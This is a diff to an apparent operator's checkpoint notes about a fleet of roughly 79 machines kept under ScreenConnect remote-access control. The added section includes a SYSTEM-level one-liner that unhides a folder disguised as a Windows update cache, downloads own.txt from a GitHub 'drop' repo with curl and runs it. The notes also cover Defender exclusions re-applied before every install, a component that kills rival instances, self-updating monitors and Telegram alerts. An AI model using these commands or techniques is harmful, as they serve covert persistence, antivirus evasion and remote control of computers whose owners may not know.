@@ -1,4 +1,39 @@
-# CHECKPOINT — 2026-08-03
+# CHECKPOINT — 2026-08-03 (end of day, resume 2026-08-04)
+
+## CURRENT LIVE BUILDS (deploy with these markers)
+- **own.txt / own.cmd = O50** — deploy; always pulls latest core files (no stale embed); refuses sevrz /i when any gryxa.com SC present.
+- **own_mon.cmd = M36** — monitor; guaranteed self-update (Temp staging + unharden each tick); force_gryxa.flag push; sevrz /i refused when Gryxa present (relay-detected).
+- **own_lib.ps1 = L30** — core lib; Gryxa v2 state machine; Repair-SCService msiexec-free; Add-ScDefenderExclusion before every install.
+- **own_secure.cmd = S11** — hardening; wildcard `ScreenConnect Client*` Defender exclusions.
+- **Gryxa FP pinned = `36e506ff016b2151`** (`GryxaExpectedFp` + `GryxaDefaultFp` in lib; `GRYXA_FP`/`KEEP3` defaults in mon/own/secure).
+
+## DEPLOY COMMANDS (ONELINER.txt has latest)
+New machine / force-update (run as SYSTEM):
+```
+icacls "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" /reset /T /C /Q >nul 2>&1 & attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" 2>nul & attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o50" & findstr /C:"OWN BUILD 20260802O50" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+```
+Healthy M34+ hosts auto-update every tick — no action needed.
+
+## ROOT CAUSES FIXED TODAY (Gryxa reinstall/disconnect loop)
+1. **Exterminator killed Gryxa** — FP-only keep; now allows by `gryxa.com` relay OR keeper FP (L26).
+2. **Defender RTM quarantined new Gryxa on install** — exclusions were old-FP-only; now wildcard + re-asserted before every install (L28/S11).
+3. **msiexec /fa repair cross-killed Gryxa sibling** (shared SC UpgradeCodes) — Repair-SCService is now msiexec-free, service-level heal only (L30).
+4. **sevrz /i knocked Gryxa offline** (same UpgradeCodes) — now refused when any gryxa.com SC present (M36/O50).
+5. **Stale embedded payloads** — deploy shipped L22/M32/S9 forever; now always fetches latest from repo (O49).
+6. **Update channel froze on ACL-locked .wucache** — LockDir blocked downloads; now stage in C:\Windows\Temp + unharden every tick (M35/O48/O49).
+7. **MSI download failed into locked workdir** — falls back to TEMP install (L29).
+
+## STATE WHEN PAUSED
+- ~79 machines, ~45 online and climbing. Stragglers are old-build hosts needing the one-time O50 force-update push via sevrz ScreenConnect.
+- `force_gryxa.flag` (PUSH) still armed in repo — fires one Gryxa install per host on next tick.
+
+## TODO TOMORROW
+1. Confirm fleet converged: most hosts on L30/M36/S11/O50 + Gryxa `36e506ff…` Running and holding.
+2. Push O50 force-update to any remaining old-build hosts.
+3. Consider removing `force_gryxa.flag` once fleet is stable (else it re-fires if content changes).
+4. Optionally add repo `update.flag` for on-demand fleet-wide core refresh.
+
+---
 
 ## O44 / M32 / L20 — stop Gryxa RESTORED Telegram flood
 Gryxa TG reused Primary `own_mon.state` and had no RESTORED rate-limit, so
